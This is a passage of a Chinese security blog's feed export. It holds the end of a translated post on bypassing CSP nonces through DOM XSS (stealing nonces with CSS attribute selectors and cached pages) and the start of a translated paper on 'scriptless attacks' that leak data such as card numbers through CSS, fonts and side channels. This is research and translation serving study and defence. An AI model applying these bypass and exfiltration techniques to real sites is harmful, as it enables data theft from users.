将漏洞页面0引入到自己的页面1(这边图片中的 CSS 应该是我理解错误，实际不是那段代码，我后续再修改)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B61.png" alt="此处输入图片的描述"></p><p>3.页面1 中的 js 不断向页面2 轮询这个 nonces 的值</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B64.png" alt="此处输入图片的描述"></p><p>4.轮询成功的话，就在页面1 上再动态生成一个 iframe ，iframe 的内容是有DOM XSS 漏洞的页面0，并且动态生成带有 刚刚获取到的 nonce 的 payload </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B62.png" alt="此处输入图片的描述"></p><p>5.这样就能弹窗了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B63.png" alt="此处输入图片的描述"></p><p>让我向您展示一个示例，让我们从<a href="https://cloud.google.com/appengine/docs/standard/python/getting-started/creating-guestbook" target="_blank" rel="noopener">AppEngine入门指南</a>中获取默认的Guestbook示例，并进行<a href="https://github.com/sirdarckcat/appengine-guestbook-python/commit/fc5161df0a6b778471bde879bbc44cb8a9eade59" target="_blank" rel="noopener">添加一些</a>AJAX支持和CSP nonces的修改。应用程序很简单，容易受到<a href="https://github.com/sirdarckcat/appengine-guestbook-python/blob/fc5161df0a6b778471bde879bbc44cb8a9eade59/index.html#L92" target="_blank" rel="noopener">明显的XSS攻击</a>，但它可以<a href="https://github.com/sirdarckcat/appengine-guestbook-python/blob/fc5161df0a6b778471bde879bbc44cb8a9eade59/guestbook.py#L91" target="_blank" rel="noopener">通过CSP nonces来缓解</a>，真的是这样吗</p><blockquote><p>这里的 iframe 由于无法引入，故请读者去看原文</p></blockquote><p>上面的应用程序有一个非常简单的存储型 XSS。只需提交XSS有效负载（例如，<code>&lt;H1&gt; XSS &lt;/ H1&gt;</code>），您就会明白我的意思。但是虽然那里有一个XSS，但由于CSP的现状，你实际上无法执行JavaScript。<br>现在，让我们进行攻击，回顾一下，我们将：</p><p>1.使用CSS属性读取器窃取CSP随机数。<br>2.使用CSP随机数注入XSS有效内容。</p><p>窃取CSP 随机数实际上需要一些服务器端代码来跟踪强制执行。您可以在<a href="https://gist.github.com/sirdarckcat/273b6449824244dee755814e1a8cb97d" target="_blank" rel="noopener">此处</a>找到代码，然后单击上面的按钮即可运行代码。</p><p>如果一切正常，单击“注入XSS有效负载”后，您应该已收到 alert。不是很好吗？。在这种情况下，我们使用的缓存是<a href="https://developer.mozilla.org/en-US/docs/Archive/Misc_top_level/Working_with_BFCache" target="_blank" rel="noopener">BFCache</a>，因为它是最可靠的，但你可以像Sebastian在<a href="http://sebastian-lekies.de/csp/attacker.php" target="_blank" rel="noopener">他的PoC</a>中那样使用传统的HTTP缓存。</p><h2 id="0X04-其他的-DOM-XSS"><a href="#0X04-其他的-DOM-XSS" class="headerlink" title="0X04 其他的 DOM XSS"></a><strong>0X04 其他的 DOM XSS</strong></h2><p>存储型性 DOM XSS并不是CSP nonces中唯一的弱点。塞巴斯蒂安在<a href="http://sebastian-lekies.de/csp/attacker3.php" target="_blank" rel="noopener">postMessage</a>上展示了同样的问题。另一个也存在问题的端点是XSS到HTTP “inclusion”。这是一个相当常见的XSS漏洞，它<strong>只是提取一些用户提供的URL并在innerHTML中回显它</strong>。这相当于JavaScript的远程文件包含。该漏洞与其他漏洞完全相同。</p><p>最后，今天的最后一个PoC是location.hash，它也很常见。也许原因是因为IE的怪癖，但许多网站必须使用位置哈希来在单页JavaScript客户端中实现历史和导航。它甚至有一个绰号”<a href="https://stackoverflow.com/questions/3009380/whats-the-shebang-hashbang-in-facebook-and-new-twitter-urls-for" target="_blank" rel="noopener">hashbang</a>“。事实上，这是非常普遍的，每个使用jQuery Mobile的网站都默认启用这个”特性”，无论他们喜欢与否。</p><p>从本质上讲，任何使用hashbang进行内部导航的网站都容易受到反射XSS的影响，就好像CSP nonces不存在一样。那太疯狂了！在<a href="https://top-dot-cspnonce-test.appspot.com/exploit?reset=1" target="_blank" rel="noopener">这里</a>查看PoC（仅限Chrome浏览器 -  Firefox转义位置.hash）。</p><h2 id="0X05-结论"><a href="#0X05-结论" class="headerlink" title="0X05 结论"></a><strong>0X05 结论</strong></h2><p>哇，这是一篇很长的博文…但至少我希望你发现它很有用，希望现在你能够更好地理解CSP的真正有效性，也许可以学习一些浏览器技巧，并希望得到一些想法用于未来的研究。</p><ul><li>CSP是否可以防止一些漏洞？应该是！我认为GOBBLES在2002年报告的所有错误都应该可以通过CSP nonces来预防。</li><li>CSP是灵丹妙药吗？不，绝对不是。它的覆盖范围和有效性比我们（或至少我）最初认为的更脆弱。</li></ul><p><strong>我们将何去何从？</strong></p><p>1.我们可以尝试在运行时锁定CSP，正如Devdatta所提出的那样。<br>2.我们可以禁止CSS3属性选择器来读取nonce属性。<br>3.我们可以放弃CSP。</p><h2 id="0X06原文链接"><a href="#0X06原文链接" class="headerlink" title="0X06原文链接"></a>0X06原文链接</h2><p><a href="http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html" target="_blank" rel="noopener">http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;CSP nonces 在对抗 DOM XSS 方面似乎并没有所谓的奇效。你可以通过几种方法绕过它们。我不知道如何修复，也许不应该修复。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;谢谢你的阅读。这篇博文讲述了CSP nonces 的绕过方法，从一些背景开始，接着介绍在几种情况下如何绕过CSP nonces，并以一些评论结束。和往常一样，这篇博文是我对这个主题的个人看法，我很想听听你的看法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0X01-我与CSP的关系-”错综复杂”&quot;&gt;&lt;a href=&quot;#0X01-我与CSP的关系-”错综复杂”&quot; class=&quot;headerlink&quot; title=&quot;0X01 我与CSP的关系,”错综复杂”&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 我与CSP的关系,”错综复杂”&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;我以前喜欢Content-Security-Policy。大约在2009年，我曾经非常兴奋。我的兴奋程度很高，我甚至花了很多时间在我的ACS项目中用JavaScript实现CSP（据我所知，这是第一个正在运行的CSP实现/原型）。&lt;strong&gt;它支持哈希和白名单&lt;/strong&gt;，我真的相信它会很棒！&lt;/p&gt;
&lt;p&gt;但有一天，我的一位来自elhacker.net（WHK）的朋友指出&lt;strong&gt;，使用JSONP可以简单地规避ACS（以及扩展的CSP）&lt;/strong&gt;。 他指出，&lt;strong&gt;如果你将包含JSONP端点的主机名列入白名单，那么安全机制就会被破坏&lt;/strong&gt;，确实有很多这样的情况，以至于我没有看到解决这个问题的简单方法,我的心碎了&lt;/p&gt;
&lt;p&gt;快进到2015年，Mario Heiderich做了一个很酷的XSS挑战，名为“&lt;a href=&quot;https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sh*t，it’s CSP！&lt;/a&gt;”，其中的挑战是以最短的有效载荷逃离一个看似安全的CSP。不出所料，JSONP出现了（但也是Angular和Flash）。&lt;/p&gt;
    
    </summary>
    
      <category term="翻译" scheme="https://www.k0rz3n.com/categories/%E7%BF%BB%E8%AF%91/"/>
    
    
      <category term="CSP" scheme="https://www.k0rz3n.com/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>无脚本攻击 - 在不触碰窗台的情况下偷取馅饼(半机翻有删增)</title>
    <link href="https://www.k0rz3n.com/2019/03/08/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%20-%20%E5%9C%A8%E4%B8%8D%E8%A7%A6%E7%A2%B0%E7%AA%97%E5%8F%B0%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%81%B7%E5%8F%96%E9%A6%85%E9%A5%BC(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <id>https://www.k0rz3n.com/2019/03/08/无脚本攻击 - 在不触碰窗台的情况下偷取馅饼(半机翻有删增)/</id>
    <published>2019-03-07T19:41:18.000Z</published>
    <updated>2019-04-28T14:11:37.621Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>由于其高实际影响，跨站点脚本（XSS）攻击引起了安全社区成员的广泛关注。同样，提出了过多或多或少有效的防御技术，解决了XSS漏洞的原因和影响。因此，攻击者通常无法在多个现实场景中注入甚至执行任意脚本代码。</p><p>在本文中，我们研究了在XSS之后仍然存在的攻击面，并且通过阻止攻击者执行JavaScript代码来减少类似的脚本攻击。我们解决了攻击者是否真的需要JavaScript或类似功能来执行针对信息窃取的攻击的问题。令人惊讶的结果是<strong>，攻击者还可以滥用层叠样式表（CSS）与其他Web技术（如纯HTML，非活动SVG图像或字体文件）一起使用</strong>。通过几个案例研究，<strong>我们引入了所谓的无脚本攻击</strong>，并证明攻击者可能不需要执行代码从受到良来好保护的网站中提取敏感信息。更确切地说，<strong>我们表明攻击者可以使用看似良性的功能来构建侧通道攻击</strong>，以测量和泄露给定网站上显示的几乎任意数据。</p><p>我们在本文结束时讨论了针对此类攻击的潜在缓解技术。此外，我们还实施了一个浏览器补丁，使网站能够做出关于在分离视图或弹出窗口中加载的重要决定。这种方法证明对于防止我们在此讨论的某些类型的攻击很有用。</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>在Web 2.0技术和云计算时代，我们可以使用丰富的强大在线应用程序。这些Web应用程序允许诸如在线银行，在线商店发起商业交易，撰写可能包含敏感信息的电子邮件，甚至在线管理个人医疗记录等活动。因此，很自然地想知道保护此类数据需要采取何种措施，特别是在安全和隐私问题方面。</p><p>突出的现实攻击向量是跨站点脚本（XSS），一种注入攻击<strong>，其中攻击者将恶意脚本注入到其他良性（和可信）网站</strong>。具体来说，XSS为攻击者提供了在脚本的帮助下跨不同站点操作Web页面的选项。对于这种攻击，JavaScript通常被用作选择的语言;一旦恶意脚本执行，它就可以完全访问属于受信任网站的所有资源（例如，cookie，身份验证令牌，CSRF令牌）。由于其高实际影响，XSS攻击和相关的浏览器安全研究近年来引起了安全界的广泛关注。</p><h3 id="通过防止代码的可执行性来防止XSS"><a href="#通过防止代码的可执行性来防止XSS" class="headerlink" title="通过防止代码的可执行性来防止XSS"></a><strong>通过防止代码的可执行性来防止XSS</strong></h3><p>根据上述发展和公布的工作，已经提出了许多或多或少可行的防御技术。所有这些尝试都有一个明确的目标：停止XSS攻击。通常，可以说如果攻击者设法在目标域上执行JavaScript，那么她可以控制受害者导航的整个网页。因此，<strong>建议的缓解策略是出于安全原因停用/限制JavaScript代码执行</strong>，使用NoScript ，内容安全策略（CSP）等工具，或者使用HTML5-sandboxed iframe。<strong>如果应用程序可以在没有外部JavaScript的情况下运行，那么这种方法是合理的，</strong>而现代Web 2.0应用程序并不总是如此。此外，一个网站增强了其健壮性并提升了防御攻击的保护级别(这种行为的一个例子是破坏框架的代码，以减轻经典的点击劫持攻击).结果，限制或禁用JavaScript同步禁用上述保护机制。</p><p><strong>回过头来看，我们注意到XSS攻击需要满足三个保证其成功的先决条件：</strong></p><p>1.可注射性：攻击者必须能够将数据注入Web浏览器呈现的文档对象模型（DOM）中<br>2.可执行性：如果注入了JavaScript（或任何其他代码），则必须执行它。<br>3.穿透能力：<strong>攻击者获取的数据必须传递到另一个域或资源，以便进一步分析和利用。</strong></p><p>事实上，XSS最近取代了SQL注入和相关的服务器端注入攻击，成为OWASP排名中的头号威胁，这表明许多Web应用程序都满足了这三个前提条件。如上所述，<strong>针对XSS的若干当前缓解方法集中于第二前提条件</strong>，主要是因为<strong>可注入性通常是许多Web2.0应用中的期望特征</strong>。鼓励互联网用户通过DOM越来越多地使用DOM来贡献不同Web应用程序之间的内容和数据交换。因此，服务器端和客户端XSS过滤器尝试从注入的内容中删除脚本，或者，他们尝试以不在浏览器的DOM中执行的方式修改/替换这些脚本。典型的建议是：如果我们成功地防止注入JavaScript被反射或执行，可以认为Web应用程序可以抵御XSS攻击。</p><p>请注意，浏览器的呈现引擎通常用于其他工具，例如电子邮件客户端或即时消息程序，以显示HTML内容。默认情况下，在这些类型的软件中禁用脚本以防止在电子邮件处理或即时消息传递的上下文中发生XSS等攻击。同样，防御方法是通过防止第二个前提条件发生来缓和攻击。</p><h3 id="超越基于脚本的攻击"><a href="#超越基于脚本的攻击" class="headerlink" title="超越基于脚本的攻击"></a><strong>超越基于脚本的攻击</strong></h3><p>在本文中，我们通过在实践中检查来评估限制脚本内容是否足以用于减轻攻击。我们提出攻击者实际上需要JavaScript（或其他语言）来执行XSS攻击的问题。我们在整篇论文中使用的攻击模型如下。<strong>首先，我们假设前提条件1仍然满足</strong>，这在如上所述的现代Web应用程序中是合理的。<strong>其次，我们假设脚本完全禁用，因此我们可以确定XSS攻击不起作用，因为不能满足可执行性的前提条件</strong>（即，不会执行JavaScript内容）。前提条件3由绝大多数Web应用程序授予，因为需要进行大量工作以确保应用程序本身阻止对任意外部域的HTTP请求。</p><p>值得注意的是，<strong>这种攻击模型可以让攻击者将任意标记（如层叠样式表（CSS）标记）注入网站</strong>。我们表明CSS标记（传统上被认为仅用于装饰/显示目的）实际上使攻击者能够执行恶意活动。更准确地说，<strong>我们证明了攻击者可以将CSS与其他Web技术结合使用，例如非活动SVG图像，字体文件，HTTP请求和普通非活动HTML，这些都可以实现类似JavaScript的部分行为。</strong>因此，攻击者可以从指定站点窃取敏感数据，包括密码。对于这项工作，我们的运行示例是一个Web应用程序，其中包含用于输入信用卡信息的表单。我们介绍了几种我们称之为无脚本攻击的新型攻击，<strong>因为攻击者可以通过向此页面注入标记来获取信用卡号，而无需依赖任何类型的（JavaScript）代码执行</strong>。我们提出了几种概念验证无脚本攻击，其复杂程度越来越高，说明了我们技术的实际可行性。</p><p>所讨论的攻击都不依赖于受害者的用户交互，而是使用良性HTML，CSS和Web开放字体格式（WOFF）功能的组合，结合基于HTTP请求的侧通道来测量和渗透几乎任意网站上显示的数据。</p><p>必须强调的是，旨在防止XSS的传统服务器和客户端防御机制（如HTMLPurifier，NoScript或其他几种经过测试的XSS过滤解决方案）尚未完全准备好应对我们的无脚本攻击。这主要是因为我们不依赖于注入脚本或执行代码。<br>作为进一步的贡献，我们提出了针对这种新型攻击的新保护机制。由于攻击媒介的过滤可能会影响网站的常规内容，因此我们专注于消除可以执行提议的攻击的条件，从根本上防止对攻击者服务器的请求。我们已经实现了一个浏览器补丁，它为网站提供了一个能力，可以确定它是在分离视图还是弹出窗口中加载。这种方法证明对于防止某些类型的无脚本攻击和其他攻击向量是有用的。</p><h3 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a><strong>贡献</strong></h3><p><strong>总之，我们在本文中做出以下三点贡献：</strong></p><ul><li><p>我们描述了一种攻击面，该攻击面是由现代Web应用程序中不受信任内容的脚本功能划分而产生的。我们将展示攻击者如何在严格受限的执行环境中部署恶意代码。我们将此类攻击标记为无脚本因为它们不需要执行（JavaScript）代码。</p></li><li><p>我们讨论了几个新颖的攻击向量，这些向量足够复杂，可以从给定的网站中提取敏感数据（我们的运行示例涉及获取信用卡号），这样做无需执行脚本代码<strong>。攻击利用一系列良性特征，这些特征组合在一起会产生导致数据泄漏的攻击向量</strong>。我们证明了专有功能以及W3C标准化浏览器功能可用于连接无害功能，以充当强大而强大的侧通道攻击。<strong>所描述的攻击涉及跨站请求伪造（CSRF）和保护CSP</strong>，它们适用于泄漏给定网站上显示的几乎任意数据。<strong>此外，我们将Web和SVG字体识别为强大的工具，用于帮助攻击者从注入的网站获取和泄露敏感数据。</strong>我们已经为所有攻击实施了概念验证示例。</p></li><li><p>我们详细阐述了针对无脚本攻击的现有防御机制，特别是指内容安全策略（CSP）等保护技术。遗憾的是，我们还确定了基于CSP的保护方面的差距，并涵盖了X-Frame-Options标题在无脚本攻击方面的局限性。此外，我们引入了一个新的浏览器功能，我们已经为Firefox浏览器实现了一种补丁形式，有助于减轻无脚本攻击。作为额外的结果，此功能还可以帮助缓解其他几种攻击技术，例如双击顶点和拖放攻击。</p></li></ul><h2 id="攻击面和场景"><a href="#攻击面和场景" class="headerlink" title="攻击面和场景"></a><strong>攻击面和场景</strong></h2><p>在过去几年中，随着许多新的复杂技术的引入，防止对Web应用程序的攻击，成功攻击的标准得到了显着提升。我们推测这主要是由于大量已发布的漏洞利用，与HTML5相关的技术的兴起，以及非浏览器环境中HTML使用的日益普及，即浏览器的渲染引擎被广泛使用诸如Pidgin和Skype等即时通讯工具，Outlook，Thunderbird和Opera Mail等电子邮件客户端，娱乐硬件和软件以及最终操作系统（如Windows8）等环境。因此，所有这些环境都需要保护基于HTML的攻击。这导致了许多防御方法的稳步发展。另外值得注意的是，安装NoScript等安全扩展的用户数量正在增长：NoScript通过简单地禁止JavaScript执行来阻止对网站用户的大范围攻击。因此，针对Web应用程序的攻击变得更加困难，并且部署最新防御技术的网站已经可以抵抗大量攻击媒介。</p><p>鉴于所有这些防御策略，<strong>我们希望攻击者能够发展为在渲染上下文中起作用的技术，这些上下文不允许脚本执行或严重限制已执行脚本的功能</strong>。</p><p>例如，<strong>HTML5建议将沙盒的iframe用于不受信任的内容</strong>;这些本质上限制了脚本执行，直到完全阻止它，它们将成为未来Web应用程序的关键信任令牌。因此可以想到一个非常基本的问题：对手是否仍然可以在这种受限制的环境中执行恶意计算？</p><p>一个持续可行的攻击场景是开发通过（ab）<strong>使用看似良性的特征并将它们连接成实际攻击向量来跨域检索和泄漏数据的技术</strong>。我们假设这些情景在未来将变得重要，因为上面讨论的一些防御技术继续增长。此处引入的攻击基于这种“可注入”的精确方法和目标系统，但<strong>它们无法执行任何JavaScript（或其他语言）代码</strong>。因此，<strong>我们称我们的方法无脚本攻击</strong>。在创建这些攻击期间，我们的目标是实现类似于传统XSS攻击的数据泄漏。</p><p>以下列表简要描述了在浏览器或类似浏览器的软件中使用HTML的一些场景，但出于安全和/或隐私原因，JavaScript受到限制或完全禁用。我们的攻击技术针对这些情况，因为即使在如此严格受限的环境中，无脚本攻击还是能导致信息泄露</p><h3 id="1-HTML5-Iframe-沙箱"><a href="#1-HTML5-Iframe-沙箱" class="headerlink" title="1.HTML5 Iframe 沙箱:"></a><strong>1.HTML5 Iframe 沙箱:</strong></h3><p>HTML规范描述了一种功能，该功能允许网站构建任意数据，而不会使其执行脚本和类似的活动内容。<strong>只需应用具有沙箱属性的iframe元素即可调用所谓的iframe沙箱</strong>。默认情况下，沙箱是严格的，并阻止执行任何活动内容，表单功能，定位不同视图和插件容器的链接。可以通过向该属性内容添加以空格分隔的值来放宽限制。因此，使用这些设置，开发人员可以例如允许编写脚本但禁止访问父框架，允许表单功能或允许弹出窗口和模式对话框。虽然沙盒的iframe目前仅在Google Chrome和Microsoft Internet Explorer中可用，但我们预测它们会被广泛采用，因为所述功能会出现在HTML5规范中。早期版本的Internet Explorer中提供了标记为安全限制的iframe的沙盒Iframe的简化版本，例如在MSIE 6.0中。</p><h3 id="2-内容安全策略-CSP"><a href="#2-内容安全策略-CSP" class="headerlink" title="2.内容安全策略 (CSP):"></a><strong>2.内容安全策略 (CSP):</strong></h3><p>内容安全策略是一种提议且积极开发的隐私和安全工具。具体来说，它可以在Mozilla Firefox和Google Chrome浏览器中使用。 CSP的目的是基于HTTP头和元元素限制所讨论的网站的内容使用;例如，开发人员可以指示用户代理忽略内联脚本，跨域资源，事件处理程序，插件数据以及Web字体等可比较资源。在第4节中，我们将讨论当前状态下的CSP如何帮助减轻第3节中引入的攻击。</p><h3 id="3-NoScript和类似的脚本拦截器："><a href="#3-NoScript和类似的脚本拦截器：" class="headerlink" title="3.NoScript和类似的脚本拦截器："></a><strong>3.NoScript和类似的脚本拦截器：</strong></h3><p>NoScript是由Maone，G组成和维护的相当流行的Firefox扩展。除了与此工作无关的几个功能之外，<strong>NoScript的目的是阻止访问过的网站上的不受信任的脚本内容。</strong></p><p>通常，除了少数可信的默认来源之外的所有脚本和内容源都被阻止。特定用户可以临时或以永久方式决定是否信任内容源并启用它。</p><p>NoScript属于我们的研究范围：我们试图绕过其保护并获得执行恶意代码的能力，尽管它存在。让我们强调，无脚本攻击已被证明对此目的非常有效。</p><h3 id="4-客户端-XSS-过滤器"><a href="#4-客户端-XSS-过滤器" class="headerlink" title="4.客户端 XSS 过滤器"></a><strong>4.客户端 XSS 过滤器</strong></h3><p>多个用户代理提供集成的XSS过滤器。这适用于Microsoft Internet Explorer和Google Chrome以及安装了NoScript扩展程序的Firefox<strong>。我们的无脚本攻击旨在绕过这些过滤器并执行恶意代码</strong>，尽管它们存在。在几个例子中，我们能够实现我们的目标，尽管过滤器检测到攻击并阻止脚本执行反应。</p><h3 id="5-电子邮件客户端和即时消息："><a href="#5-电子邮件客户端和即时消息：" class="headerlink" title="5.电子邮件客户端和即时消息："></a><strong>5.电子邮件客户端和即时消息：</strong></h3><p>如上所述，浏览器的布局引擎通常不是浏览器本身专用的，因为诸如电子邮件客户端和即时消息程序之类的多个工具同样使用可用的HTML呈现引擎来实现其目的。 Mozilla Thunderbird可以作为一个具体的例子来讨论。默认情况下，在此类软件中禁用脚本：<strong>允许在邮件正文中使用JavaScript甚至插件内容的电子邮件客户端可能会导致严重的隐私隐患</strong>。因此，无脚本攻击为攻击者提供了执行恶意代码的潜在方式。</p><p>总之，有很多攻击场景，其中攻击者无法执行脚本，或者受到执行脚本功能的严重限制。</p><h2 id="超越基于脚本的攻击-1"><a href="#超越基于脚本的攻击-1" class="headerlink" title="超越基于脚本的攻击"></a><strong>超越基于脚本的攻击</strong></h2><p>在本节中，我们将讨论在调查与无脚本攻击相关的攻击面时我们开发的攻击的技术细节。正如我们将看到的，无脚本攻击可以提供一个可行的解决方案，然而在上一节中描述的上下文中渗透和窃取敏感信息，绕过许多可用的防御解决方案，例如沙盒Iframe，脚本阻止程序（即NoScript）或客户端XSS过滤器。对于本文的其余部分，我们假设攻击者具有以下功能：</p><p><strong>1.攻击者可以将任意数据注入浏览器呈现的DOM中</strong></p><p>例如Webmail应用程序中的HTML邮件正文。对于鼓励用户贡献内容的现代Web 2.0应用程序，这是一个可行的假设。此外，根据OWASP排名，XSS攻击被列为头号威胁这一事实表明许多Web应用程序中存在注入漏洞。</p><p><strong>2.我们假设脚本完全禁用</strong></p><p>例如，我们的用户安装了NoScript或类似的防御解决方案，防止攻击者进行代码注入和后续执行。请注意，传统的XSS攻击在此设置中是不可行的，因为无法执行JavaScript（或任何其他语言）内容。</p><p>我们借助处理信用卡号的简单Web应用程序来说明我们的攻击 </p><p>它可以与亚马逊网上商店或应用了适合处理或委托信用卡交易的后端的类似网站进行比较。此Web应用程序允许我们在概念验证场景中演示我们的攻击向量。我们专门选择了信用卡号码处理，因为它们只包含16位数字，例如4000 1234 5678 9010.这使我们能够在短时间内泄露信息。请注意，我们的操作也适用于其他攻击情形，我们将举例说明如何使用我们的方法窃取CSRF令牌和其他类型的敏感信息。此外，我们实现了一个<a href="http://html5sec.org/keylogger/" target="_blank" rel="noopener">无脚本键盘记录程序</a>，允许远程攻击者捕获在网页上输入的击键，即使禁用了JavaScript（此漏洞也被跟踪为CVE-2011-匿名化）。</p><h3 id="攻击组件"><a href="#攻击组件" class="headerlink" title="攻击组件"></a><strong>攻击组件</strong></h3><p>以下各节中描述的攻击利用了现代用户代理中可用的几种标准浏览器功能，并在HTML和CSS3规范草案中定义。在继续演示它们如何组合以构成工作攻击向量之前，我们列出并简要解释这些功能。<strong>更具体地说，我们展示了如何滥用合法的浏览器功能来泄露内容或建立功能性的侧通道以从Web浏览器获取特定信息。</strong></p><p><strong>我们发现以下浏览器功能是构建攻击的有用构建块：</strong></p><h4 id="1-基于SVG和WOFF的Web字体："><a href="#1-基于SVG和WOFF的Web字体：" class="headerlink" title="1.基于SVG和WOFF的Web字体："></a><strong>1.基于SVG和WOFF的Web字体：</strong></h4><p>HTML和CSS规范建议浏览器供应商为不同的Web字体格式提供支持。<br>其中包括可缩放矢量图形（SVG）字体和Web开放字体格式（WOFF）。我们的攻击使用这些字体并利用其功能来改变显示的网站内容的属性。 SVG字体允许攻击者轻松修改字符和字形表示，更改单个字符的外观以及使其维度多样化。可以简单地使用诸如宽度之类的属性来通过分配“零宽度”来确保某些字符没有尺寸，而其他属性可以具有不同的且受攻击者控制的尺寸。 WOFF结合CSS3允许使用称为自由连字或上下文替代的特征。通过为WOFF字体指定那些，几乎任何长度的任意字符串可以由单个字符表示（再次给出用于最终测量目的的不同尺寸）。</p><h4 id="2-基于CSS的动画："><a href="#2-基于CSS的动画：" class="headerlink" title="2.基于CSS的动画："></a><strong>2.基于CSS的动画：</strong></h4><p>使用基于CSS的动画，可以随着时间的推移更改各种CSS和DOM属性，而无需使用任何脚本代码。允许通过CSS动画进行更改的属性由规范标记为可动画。</p><p>例如，<strong>攻击者可以使用CSS动画来更改包含敏感信息的DOM节点周围的容器的宽度或高度。</strong><br>通过能够缩放容器，可以强制所包含的内容以特定方式对尺寸变化作出反应。一种反应是断线或溢出容器。如果这些行为是可测量的，动画可能会根据特定行为的计时参数导致信息泄漏。</p><h4 id="3-CSS内容属性："><a href="#3-CSS内容属性：" class="headerlink" title="3.CSS内容属性："></a><strong>3.CSS内容属性：</strong></h4><p>CSS允许使用名为content的属性来提取任意属性值，并在所选元素之前，之后或之后显示值。属性值提取可以由属性值函数的use attr触发。对于此功能的良性用例，请考虑以下情况：开发人员希望通过在显示链接后简单地呈现href属性的内容来显示其网站上所有或所选链接的链接URL，但仅限于绝对链接网址。通过使用以下CSS代码，这是可行的：</p><pre><code>a[href^=http://]:after{content:attr(href)}</code></pre><p>此强大功能<strong>还可用于提取敏感属性值，如CSRF令牌，密码字段值和类似数据</strong>。随后，可以在属性上下文之外使它们可见。将提取的信息与字体注入相结合，可提供强大的测量杆和侧通道。实际上，这种组合构成了第3.2节和第3.3节中讨论的攻击的重要方面。</p><h4 id="4-CSS媒体查询"><a href="#4-CSS媒体查询" class="headerlink" title="4.CSS媒体查询"></a><strong>4.CSS媒体查询</strong></h4><p>CSS Media Queries为网站开发人员提供了<strong>一种部署依赖于设备的样式表的便捷方式</strong>。用户代理可以使用媒体查询来例如确定访问网站的设备是否具有视口宽度大于300像素的显示器。如果是这种情况，将部署针对更宽屏幕优化的样式表。否则，将选择针对智能手机和通常较小的屏幕和视口进行优化的样式表。清单1中显示的示例代码说明了一般技术;如果访问部署此CSS代码段的网站的设备的视口宽度大于400像素，则背景变为绿色;如果屏幕仅允许较小的视口宽度，则背景将为红色。</p><blockquote><p>请注意，这些不同的组件都是浏览器中的合法和良性功能。只有在组合时，它们才会被滥用以建立辅助渠道并衡量给定网站的特定方面。</p></blockquote><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB1.png" alt="此处输入图片的描述"></p><h3 id="使用Smart-Scrollbars进行基于测量的内容渗透"><a href="#使用Smart-Scrollbars进行基于测量的内容渗透" class="headerlink" title="使用Smart Scrollbars进行基于测量的内容渗透"></a><strong>使用Smart Scrollbars进行基于测量的内容渗透</strong></h3><p>最初，我们决定将我们的分析重点放在基于Webkit的浏览器上，因为这个浏览器布局引擎已经广泛部署。其中包括谷歌Chrome和Safari，这反过来意味着我们涵盖台式电脑，笔记本电脑，iPhone和iPad，以及各种Android浏览器，Blackberry和Tablet 